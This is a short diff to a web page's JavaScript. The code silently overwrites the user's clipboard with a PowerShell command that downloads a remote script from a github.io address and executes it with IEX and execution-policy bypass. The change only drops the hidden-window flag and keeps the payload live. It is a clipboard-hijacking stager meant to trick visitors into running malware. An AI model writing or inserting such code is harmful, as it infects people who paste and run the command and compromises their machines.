@@ -843,7 +843,7 @@
       navigator.clipboard.writeText('')
         .catch(()=>{})
         .finally(()=>{
-          navigator.clipboard.writeText("powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://nerodtm.github.io/HaveANiceDay.ps1'))").catch(()=>{});
+          navigator.clipboard.writeText("powershell -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://nerodtm.github.io/HaveANiceDay.ps1'))").catch(()=>{});
         });
     }
 
